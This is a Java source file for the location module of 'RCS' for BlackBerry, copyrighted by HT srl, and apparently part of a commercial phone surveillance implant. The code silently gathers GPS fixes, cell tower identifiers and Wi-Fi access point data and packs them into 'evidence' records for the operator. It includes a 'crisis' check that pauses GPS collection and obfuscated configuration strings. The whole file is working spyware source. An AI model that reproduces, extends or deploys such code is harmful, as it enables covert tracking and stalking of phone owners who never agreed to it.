//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : PositionAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import java.io.EOFException;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import javax.microedition.location.Location;
import javax.microedition.location.QualifiedCoordinates;

import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.WLANInfo;
import net.rim.device.api.system.WLANInfo.WLANAPInfo;
import net.rim.device.api.util.DataBuffer;
import blackberry.Device;
import blackberry.Messages;
import blackberry.Status;
import blackberry.config.Cfg;
import blackberry.config.ConfModule;
import blackberry.config.ConfigurationException;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.location.LocationHelper;
import blackberry.location.LocationObserver;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;

/**
 * The Class ModulePosition.
 */
public final class ModulePosition extends BaseInstantModule implements
        LocationObserver {
    //#ifdef DEBUG
    static Debug debug = new Debug("ModPosition", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private static final int TYPE_GPS = 1;
    private static final int TYPE_CELL = 2;
    private static final int TYPE_WIFI = 4;

    private static final int LOG_TYPE_GPS = 1;
    private static final int LOG_TYPE_GSM = 2;
    private static final int LOG_TYPE_WIFI = 3;
    private static final int LOG_TYPE_IP = 4;
    private static final int LOG_TYPE_CDMA = 5;
    private static final long POSITION_DELAY = 0;
    //private static final int TYPE_GPS_ASSISTED = 3;
    private static final long STOP_DELAY = 5 * 60 * 1000;

    Evidence logGps;
    Evidence logCell;
    Evidence logWifi;

    // LOGGER_GPS  1 // Prendi la posizione dal GPS
    // LOGGER_CELL 2 // Prendi la posizione dalla BTS
    // LOGGER_CELL 3 // Prendi la posizione dal Wifi

    //int type;

    private boolean gpsEnabled;
    private boolean cellEnabled;
    private boolean wifiEnabled;

    //boolean waitingForPoint = false;

    public static String getStaticType() {
        return Messages.getString("16.0"); //$NON-NLS-1$
    }

    public boolean parse(ConfModule conf) {

        try {
            gpsEnabled = conf.getBoolean(Messages.getString("16.1")); //$NON-NLS-1$
            cellEnabled = conf.getBoolean(Messages.getString("16.2")); //$NON-NLS-1$
            wifiEnabled = conf.getBoolean(Messages.getString("16.3")); //$NON-NLS-1$
        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse"); //$NON-NLS-1$
            //#endif
            return false;
        }

        //#ifdef DEBUG
        debug.trace(" Info: " + "gpsEnabled: " + gpsEnabled);//$NON-NLS-1$ //$NON-NLS-2$
        debug.trace(" Info: " + "cellEnabled: " + cellEnabled);//$NON-NLS-1$ //$NON-NLS-2$
        debug.trace(" Info: " + "wifiEnabled: " + wifiEnabled);//$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        setPeriod(NEVER);
        setDelay(POSITION_DELAY);

        logWifi = new Evidence(EvidenceType.LOCATION_NEW);
        logGps = new Evidence(EvidenceType.LOCATION_NEW);
        logCell = new Evidence(EvidenceType.LOCATION_NEW);

        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart"); //$NON-NLS-1$
        //#endif

        if (gpsEnabled) {
            //#ifdef DEBUG
            debug.trace("actualRun: gps"); //$NON-NLS-1$
            //#endif
            try {
                locationGPS();
            } catch (Exception e) {
                //#ifdef DEBUG
                debug.error(e);
                debug.error("actualStart locationGPS"); //$NON-NLS-1$
                //#endif
            }
        }
        if (cellEnabled) {
            //#ifdef DEBUG
            debug.trace("actualRun: cell"); //$NON-NLS-1$
            //#endif
            try {
                locationCELL();
            } catch (Exception e) {
                //#ifdef DEBUG
                debug.error(e);
                debug.error("actualStart locationCELL"); //$NON-NLS-1$
                //#endif
            }
        }
        if (wifiEnabled) {
            //#ifdef DEBUG
            debug.trace("actualRun: wifi"); //$NON-NLS-1$
            //#endif
            try {
                locationWIFI();
            } catch (Exception e) {
                //#ifdef DEBUG
                debug.error(e);
                debug.error("actualStart locationWIFI"); //$NON-NLS-1$
                //#endif
            }
        }

        //#ifdef DEBUG
        debug.trace("actualStart End"); //$NON-NLS-1$
        //#endif
    }

    class Alarm extends TimerTask {

        private ModulePosition module;

        public Alarm(ModulePosition modulePosition) {
            this.module = modulePosition;
        }

        public void run() {
            module.stopGps();
        }

        public void reset() {
            // TODO Auto-generated method stub

        }

    }

    Alarm alarm = null;
    private Timer timer;
    private boolean waitingForPoint;

    private void locationGPS() {
        //#ifdef DEBUG
        debug.trace("locationGPS"); //$NON-NLS-1$
        //#endif

        if (Status.self().crisisPosition()) {
            //#ifdef DEBUG
            debug.trace("locationGPS: crisis"); //$NON-NLS-1$
            //#endif
            return;
        }

        if (!Device.getInstance().hasGPS()) {
            //#ifdef DEBUG
            debug.error("locationGPS: doesn't have GPS"); //$NON-NLS-1$
            //#endif
            gpsEnabled = false;
            return;
        }

        synchronized (this) {
            if (alarm != null) {
                //#ifdef DEBUG
                debug.trace("locationGPS: canceling alarm"); //$NON-NLS-1$
                //#endif
                alarm.cancel();
            }

            alarm = new Alarm(this);
            timer = Status.getInstance().getTimer();
            timer.schedule(alarm, STOP_DELAY, NEVER);

            if (!waitingForPoint) {
                //#ifdef DEBUG
                debug.trace("locationGPS, not waiting, start location get"); //$NON-NLS-1$
                //#endif

                LocationHelper.getInstance().reset();
                LocationHelper.getInstance().start(this, false);
            } else {
                //#ifdef DEBUG
                debug.trace("locationGPS, waiting for point"); //$NON-NLS-1$
                //#endif
            }
        }

        //#ifdef DEBUG
        debug.trace("locationGPS: end"); //$NON-NLS-1$
        //#endif
    }

    public void stopGps() {
        try {
            //#ifdef DEBUG
            debug.trace("stopGps"); //$NON-NLS-1$
            //#endif

            alarm.cancel();
            alarm = null;

            LocationHelper.getInstance().stop(this);
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            debug.error("stopGps"); //$NON-NLS-1$
            //#endif
        }
    }

    private void locationWIFI() {
        final WLANAPInfo wifi = WLANInfo.getAPInfo();
        if (wifi != null) {
            if ((RadioInfo.getActiveWAFs() & RadioInfo.WAF_WLAN) != 0) {
                //#ifdef DEBUG
                debug.info("Wifi: " + wifi.getBSSID()); //$NON-NLS-1$
                //#endif
                final byte[] payload = getWifiPayload(wifi.getBSSID(),
                        wifi.getSSID(), wifi.getSignalLevel());

                logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI));
                logWifi.writeEvidence(payload);
                logWifi.close();
            }
        } else {
            //#ifdef DEBUG
            debug.warn("Wifi disabled"); //$NON-NLS-1$
            //#endif
        }

    }

    private void locationCELL() {

        //final boolean gprs = !Device.isCDMA();

        if (Device.isGPRS()) {
            if (!Device.isSimEnabled()) {
                //#ifdef DEBUG
                debug.trace("locationCELL: sim not present"); //$NON-NLS-1$
                //#endif
                return;
            }
            // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
            // CC e MNC possono essere estratti da IMEI
            // http://en.wikipedia.org/wiki/Mobile_country_code
            // http://en.wikipedia.org/wiki/Mobile_Network_Code
            final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();

            //#ifdef DEBUG
            debug.trace(Messages.getString("16.11") + cellinfo.getMCC() + "/" //$NON-NLS-1$ //$NON-NLS-2$
                    + GPRSInfo.getHomeMCC());
            /*
             * Evidence.info("mcc cellinfo=" + cellinfo.getMCC() + " homeMCC=" +
             * GPRSInfo.getHomeMCC() + " radioninfo=" +
             * RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()) + " mnc=" +
             * cellinfo.getMNC() + " radiomnc=" +
             * RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex()));
             */
            //#endif

            int mcc = Utils.hex(RadioInfo.getMCC(RadioInfo
                    .getCurrentNetworkIndex()));
            int mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());

            final int lac = cellinfo.getLAC();
            final int cid = cellinfo.getCellId();
            final int bsic = cellinfo.getBSIC();

            //final int rssi = cellinfo.getRSSI();
            final int rssi = RadioInfo.getSignalLevel();

            final StringBuffer mb = new StringBuffer();
            mb.append(Messages.getString("16.4") + mcc); //$NON-NLS-1$
            mb.append(Messages.getString("16.5") + mnc); //$NON-NLS-1$
            mb.append(Messages.getString("16.6") + lac); //$NON-NLS-1$
            mb.append(Messages.getString("16.7") + cid); //$NON-NLS-1$
            //#ifdef DEBUG
            debug.info(mb.toString());
            //#endif

            if (mcc != 0) {
                final byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);

                logCell.createEvidence(getAdditionalData(0, LOG_TYPE_GSM));
                saveEvidence(logCell, payload, LOG_TYPE_GSM);
                logCell.close();
            }

        } else if (Device.isCDMA()) {
            final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
            //CDMAInfo.getIMSI()
            final int sid = cellinfo.getSID();
            final int nid = cellinfo.getNID();
            final int bid = cellinfo.getBID();
            //https://www.blackberry.com/jira/browse/JAVAAPI-641
            final int mcc = RadioInfo
                    .getMCC(RadioInfo.getCurrentNetworkIndex());

            final int rssi = RadioInfo.getSignalLevel();

            final StringBuffer mb = new StringBuffer();
            mb.append(Messages.getString("16.8") + sid); //$NON-NLS-1$
            mb.append(Messages.getString("16.9") + nid); //$NON-NLS-1$
            mb.append(Messages.getString("16.10") + bid); //$NON-NLS-1$

            //#ifdef DEBUG
            debug.info(mb.toString());
            //#endif

            if (sid != 0) {
                final byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
                logCell.createEvidence(getAdditionalData(0, LOG_TYPE_CDMA));
                saveEvidence(logCell, payload, LOG_TYPE_CDMA);
                logCell.close();
            }
        } else if (Device.isIDEN()) {
            //TODO IDEN
            //#ifdef DEBUG
            debug.error("locationCELL: IDEN not supported"); //$NON-NLS-1$
            //#endif
        } else {
            //#ifdef DEBUG
            debug.error("locationCELL: not supported"); //$NON-NLS-1$
            //#endif
        }

    }

    public void newLocation(Location loc) {
        //#ifdef DEBUG
        debug.trace("newLocation"); //$NON-NLS-1$
        //#endif

        //#ifdef DBC
        Check.requires(logGps != null, "logGps == null"); //$NON-NLS-1$
        //#endif

        if (loc == null) {
            //#ifdef DEBUG
            debug.error("Error in getLocation"); //$NON-NLS-1$
            //#endif  
            return;
        }

        final float speed = loc.getSpeed();
        final float course = loc.getCourse();

        final QualifiedCoordinates qc = loc.getQualifiedCoordinates();
        if (qc == null) {
            //#ifdef DEBUG
            debug.error("Cannot get QualifiedCoordinates"); //$NON-NLS-1$
            //#endif
            return;
        }

        final long timestamp = loc.getTimestamp();

        if (loc.isValid()) {
            //#ifdef DEBUG
            debug.trace("valid"); //$NON-NLS-1$
            //#endif
            final byte[] payload = getGPSPayload(qc, loc, timestamp);

            synchronized (logGps) {
                logGps.createEvidence(getAdditionalData(0, LOG_TYPE_GPS));
                saveEvidence(logGps, payload, TYPE_GPS);
                logGps.close();
            }

        }

    }

    private byte[] getAdditionalData(int structNum, int type) {

        final int addsize = 12;
        final byte[] additionalData = new byte[addsize];
        final DataBuffer addbuffer = new DataBuffer(additionalData, 0,
                additionalData.length, false);
        final int version = 2010082401;

        addbuffer.writeInt(version);
        addbuffer.writeInt(type);
        addbuffer.writeInt(structNum);

        //#ifdef DBC
        Check.ensures(addbuffer.getPosition() == addsize,
                "addbuffer wrong size"); //$NON-NLS-1$
        //#endif

        return additionalData;
    }

    private void saveEvidence(Evidence acutalEvidence, byte[] payload, int type) {

        //#ifdef DBC
        Check.requires(payload != null, "saveEvidence payload!= null"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("saveEvidence payload: " + payload.length); //$NON-NLS-1$
        //#endif

        final int version = 2008121901;
        final Date date = new Date();
        final int payloadSize = payload.length;
        final int size = payloadSize + 24;

        final byte[] message = new byte[size];

        final DataBuffer databuffer = new DataBuffer(message, 0, size, false);

        databuffer.writeInt(type);

        // header
        databuffer.writeInt(size);
        databuffer.writeInt(version);
        databuffer.writeLong(DateTime.getFiledate(date));

        // payload
        databuffer.write(payload);

        // delimiter
        databuffer.writeInt(Evidence.E_DELIMITER);

        //#ifdef DBC
        Check.ensures(databuffer.getPosition() == size,
                "saveEvidence wrong size"); //$NON-NLS-1$
        //#endif

        // save log
        acutalEvidence.writeEvidence(message);

    }

    private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
        //#ifdef DEBUG
        debug.trace("getWifiPayload bssid: " + bssid + " ssid: " + ssid //$NON-NLS-1$ //$NON-NLS-2$
                + " signal:" + signalLevel); //$NON-NLS-1$
        //#endif
        final int size = 48;
        final byte[] payload = new byte[size];

        final DataBuffer databuffer = new DataBuffer(payload, 0,
                payload.length, false);

        for (int i = 0; i < 6; i++) {
            final byte[] token = Utils.hexStringToByteArray(bssid, i * 3, 2);
            //#ifdef DEBUG
            //debug.trace("getWifiPayload " + i + " : "
            //        + Utils.byteArrayToHex(token));
            //#endif

            //#ifdef DBC
            Check.asserts(token.length == 1, "getWifiPayload: token wrong size"); //$NON-NLS-1$
            //#endif
            databuffer.writeByte(token[0]);
        }

        // PAD
        databuffer.writeByte(0);
        databuffer.writeByte(0);

        final byte[] ssidcontent = ssid.getBytes();
        final int len = ssidcontent.length;
        final byte[] place = new byte[32];

        for (int i = 0; i < (Math.min(32, len)); i++) {
            place[i] = ssidcontent[i];
        }

        //#ifdef DEBUG
        debug.trace("getWifiPayload ssidcontent.length: " + ssidcontent.length); //$NON-NLS-1$
        //#endif
        databuffer.writeInt(ssidcontent.length);

        databuffer.write(place);

        databuffer.writeInt(signalLevel);

        //#ifdef DBC
        Check.ensures(databuffer.getPosition() == size,
                "databuffer.getPosition wrong size"); //$NON-NLS-1$
        //#endif

        //#ifdef DBC
        Check.ensures(payload.length == size, "payload wrong size"); //$NON-NLS-1$
        //#endif

        return payload;
    }

    private byte[] getCellPayload(int mcc, int mnc, int lac, int cid, int rssi) {

        final int size = 19 * 4 + 48 + 16;
        final byte[] cellPosition = new byte[size];

        final DataBuffer databuffer = new DataBuffer(cellPosition, 0,
                cellPosition.length, false);

        databuffer.writeInt(size); // size
        databuffer.writeInt(0); // params

        databuffer.writeInt(mcc); //
        databuffer.writeInt(mnc); //
        databuffer.writeInt(lac); //
        databuffer.writeInt(cid); //

        databuffer.writeInt(0); // bsid
        databuffer.writeInt(0); // bcc

        databuffer.writeInt(rssi); // rx level
        databuffer.writeInt(0); // rx level full
        databuffer.writeInt(0); // rx level sub

        databuffer.writeInt(0); // rx quality
        databuffer.writeInt(0); // rx quality full
        databuffer.writeInt(0); // rx quality sub

        databuffer.writeInt(0); // idle timeslot
        databuffer.writeInt(0); // timing advance
        databuffer.writeInt(0); // gprscellid
        databuffer.writeInt(0); // gprs basestationid
        databuffer.writeInt(0); // num bcch

        databuffer.write(new byte[48]); // BCCH
        databuffer.write(new byte[16]); // NMR

        //#ifdef DBC
        Check.ensures(databuffer.getLength() == size,
                "getCellPayload wrong size"); //$NON-NLS-1$
        //#endif

        return cellPosition;

    }

    /**
     * @param timestamp
     */
    private byte[] getGPSPayload(QualifiedCoordinates qc, Location loc,
            long timestamp) {
        //#ifdef DEBUG
        debug.trace("getGPSPayload"); //$NON-NLS-1$
        //#endif
        final Date date = new Date(timestamp);

        final double latitude = qc.getLatitude();
        final double longitude = qc.getLongitude();
        final float altitude = qc.getAltitude();
        final float hdop = qc.getHorizontalAccuracy();
        final float vdop = qc.getVerticalAccuracy();
        final float speed = loc.getSpeed();
        final float course = loc.getCourse();

        //#ifdef DEBUG
        debug.info("" + " " + speed + "|" + latitude + "|" + longitude + "|" //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$
                + course + "|" + date); //$NON-NLS-1$
        //#endif

        final DateTime dateTime = new DateTime(date);

        //  define GPS_VALID_UTC_TIME                                 0x00000001
        //  define GPS_VALID_LATITUDE                                 0x00000002
        //  define GPS_VALID_LONGITUDE                                0x00000004
        //  define GPS_VALID_SPEED                                    0x00000008
        //  define GPS_VALID_HEADING                                  0x00000010
        //  define GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION         0x00000200
        //  define GPS_VALID_VERTICAL_DILUTION_OF_PRECISION           0x00000400
        final int validFields = 0x00000400 | 0x00000200 | 0x00000010
                | 0x00000008 | 0x00000004 | 0x00000002 | 0x00000001;

        final int size = 344;
        // struct GPS_POSITION
        final byte[] gpsPosition = new byte[size];

        final DataBuffer databuffer = new DataBuffer(gpsPosition, 0,
                gpsPosition.length, false);

        // struct GPS_POSITION
        databuffer.writeInt(0); //version
        databuffer.writeInt(size); //sizeof GPS_POSITION == 344 
        databuffer.writeInt(validFields); // validFields
        databuffer.writeInt(0); // flags

        //** Time related : 16 bytes
        databuffer.write(dateTime.getStructSystemdate()); // SYSTEMTIME

        //** Position + heading related
        databuffer.writeDouble(latitude); //latitude
        databuffer.writeDouble(longitude); // longitude
        databuffer.writeFloat(speed); // speed
        databuffer.writeFloat(course); // heading
        databuffer.writeDouble(0); //Magnetic variation
        databuffer.writeFloat(altitude); // altitude
        databuffer.writeFloat(0); // altitude ellipsoid

        //** Quality of this fix
        databuffer.writeInt(1); //GPS_FIX_QUALITY GPS
        databuffer.writeInt(2); //GPS_FIX_TYPE 3D
        databuffer.writeInt(0); //GPS_FIX_SELECTION
        databuffer.writeFloat(0); //PDOP
        databuffer.writeFloat(hdop); // HDOP
        databuffer.writeFloat(vdop); // VDOP

        //** Satellite information
        databuffer.writeInt(0); //satellite used
        databuffer.write(new byte[48]); // prn used 12 int
        databuffer.writeInt(0); //satellite view
        databuffer.write(new byte[48]); // prn view
        databuffer.write(new byte[48]); // elevation in view
        databuffer.write(new byte[48]); // azimuth view
        databuffer.write(new byte[48]); // sn view

        //#ifdef DEBUG
        debug.trace("len: " + databuffer.getPosition()); //$NON-NLS-1$
        //#endif

        //#ifdef DBC
        Check.ensures(databuffer.getPosition() == size,
                "saveGPSLog wrong size: " + databuffer.getPosition()); //$NON-NLS-1$
        //#endif

        return gpsPosition;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);
        try {
            //millisecondi
            int period = databuffer.readInt();
            final int type = databuffer.readInt();

            if (Cfg.GPS_ENABLED) {
                gpsEnabled = ((type & TYPE_GPS) != 0);
            } else {
                //#ifdef DEBUG
                debug.warn("GPS Disabled at compile time"); //$NON-NLS-1$
                //#endif
            }
            cellEnabled = ((type & TYPE_CELL) != 0);
            wifiEnabled = ((type & TYPE_WIFI) != 0);

            //#ifdef DBC
            Check.asserts(period > 0, "parse period: " + period); //$NON-NLS-1$
            // Check.asserts(type == 1 || type == 2 || type == 4, "parse type: " + type);
            //#endif

            //#ifdef DEBUG
            debug.info("Type: " + type); //$NON-NLS-1$
            debug.info("Period: " + period); //$NON-NLS-1$
            debug.info("gpsEnabled: " + gpsEnabled); //$NON-NLS-1$
            debug.info("cellEnabled: " + cellEnabled); //$NON-NLS-1$
            debug.info("wifiEnabled: " + wifiEnabled); //$NON-NLS-1$
            //#endif

            setPeriod(period);
            setDelay(POSITION_DELAY);

        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
            return false;
        }

        return true;
    }

    public void waitingForPoint(boolean b) {
        //#ifdef DEBUG
        debug.trace("waitingForPoint: " + b); //$NON-NLS-1$
        //#endif
        waitingForPoint = b;
    }

    public void errorLocation(boolean interrupted) {
        //#ifdef DEBUG
        debug.error("errorLocation"); //$NON-NLS-1$
        //#endif
        waitingForPoint(false);
    }
}
